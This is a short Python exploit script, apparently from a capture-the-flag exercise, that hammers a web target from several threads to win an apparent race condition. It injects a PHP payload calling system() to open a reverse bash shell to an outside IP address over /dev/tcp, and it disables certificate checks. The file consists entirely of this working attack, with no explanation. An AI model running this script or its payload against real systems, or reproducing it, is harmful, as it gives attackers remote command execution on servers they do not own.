import requests
import os
import threading
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

my_params1 = {'f': 'mydir', 'i': 'mydir/meow', 'c[]' : '<?php system("bash -c \'bash -i >&/dev/tcp/140.113.209.28/6666 0>&1\' "); ?>'}
my_params2 = {'f': 'mydir', 'i': 'mydir/meow' , 'c' : 'aaa'}

def job1():
    count1 = 0 
    while(1):
        r = requests.get('https://edu-ctf.csie.org:10155/', params = my_params1 , verify = False  , allow_redirects=False )
        count1 = count1 +1
        if count1 == 500:
            exit()     

t1 = threading.Thread(target = job1)
t1.start()
t2 = threading.Thread(target = job1)
t2.start()
count2 = 0 
while(1):
    b = requests.get('https://edu-ctf.csie.org:10155/', params = my_params2 , verify = False , allow_redirects=False)
    count2 = count2 +1
    if count2 == 500:
        exit()     
